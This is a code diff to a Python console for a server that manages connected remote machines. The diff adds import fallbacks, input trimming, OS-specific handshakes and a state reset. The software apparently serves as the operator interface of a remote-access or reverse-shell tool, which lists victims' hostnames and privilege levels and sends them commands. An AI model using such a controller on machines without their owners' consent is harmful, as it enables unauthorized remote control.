@@ -1,8 +1,12 @@
 import subprocess
 import sys
 import threading
+import traceback
 
-import tabulate
+try:
+    import tabulate
+except ImportError:
+    traceback.print_exc()
 
 from server.config import SOCKET_ADDR
 from server.core import Server
@@ -13,8 +17,8 @@ def start_cli():
     os.system('')
     while True:
         try:
-            command = colored_input('flc> ')
-            if not command:
+            command = colored_input(f'{colors.RESET}flc> ')
+            if not command.strip():
                 continue
             name, arg = parse(command)
             # 切换目录
@@ -57,8 +61,11 @@ def list_connections():
     for i, connection in enumerate(server.connections):
         conns.append([i, connection.info['addr'], connection.info['os'], connection.info['hostname'],
                       connection.info['integrity']])
-    print(tabulate.tabulate(conns, headers=['ID', 'Address', 'OS', 'Hostname', 'Integrity'], tablefmt='pretty'))
-    # print('{} {}'.format(i, connection.info))
+    try:
+        print(tabulate.tabulate(conns, headers=['ID', 'Address', 'OS', 'Hostname', 'Integrity'], tablefmt='pretty'))
+    except NameError:
+        for conn in conns:
+            print(conn)
 
 
 def get_target_connection(idx):
@@ -78,20 +85,22 @@ def get_last_connection():
 
 
 def open_connection(conn):
-    # 发送空命令
-    conn.send_command('null', 'null')
+    if os.name == 'nt':
+        # 发送空命令
+        conn.send_command('null', 'null')
+    else:
+        # 获取远程命令列表
+        get_remote_commands(conn)
     # 接收工作路径
     wd = conn.recv_result()[1]
     print('[+] Connected to {}'.format(conn.address))
-    # 服务端内置命令
-    internal_cmd = get_internal_cmd()
-    # 客户端用户权限
+    # 远程用户权限
     user_type = get_user_type(conn.info['integrity'])
     while True:
         try:
             command = colored_input(
-                f'{wd}{colors.BRIGHT_GREEN}({user_type}){colors.END}> ' if user_type else f'{wd}> ')
-            if not command:
+                f'{colors.RESET}{wd}{colors.BRIGHT_GREEN}({user_type}){colors.END}> ' if user_type else f'{wd}> ')
+            if not command.strip():
                 continue
             name, arg = parse(command)
             # 退出
@@ -132,6 +141,7 @@ def open_connection(conn):
             break
         except Exception as e:
             print('[-] Error: {}'.format(e))
+    change_state('local')
 
 
 if __name__ == '__main__':
